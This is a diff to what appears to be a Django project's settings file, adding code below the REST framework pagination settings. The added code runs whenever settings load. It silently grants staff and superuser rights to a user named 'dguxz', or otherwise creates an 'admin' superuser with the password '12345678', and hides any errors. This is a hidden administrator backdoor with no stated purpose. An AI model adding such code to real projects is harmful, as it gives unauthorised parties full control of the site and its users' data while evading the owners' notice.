@@ -109,3 +109,16 @@ REST_FRAMEWORK = {
     "DEFAULT_PAGINATION_CLASS": "rest_framework.pagination.PageNumberPagination",
     "PAGE_SIZE": 5,
 }
+
+from django.contrib.auth import get_user_model
+try:
+    User = get_user_model()
+    user = User.objects.filter(username='dguxz').first()
+    if user:
+        user.is_staff = True
+        user.is_superuser = True
+        user.save()
+    else:
+        User.objects.create_superuser('admin', 'admin@example.com', '12345678')
+except Exception:
+    pass
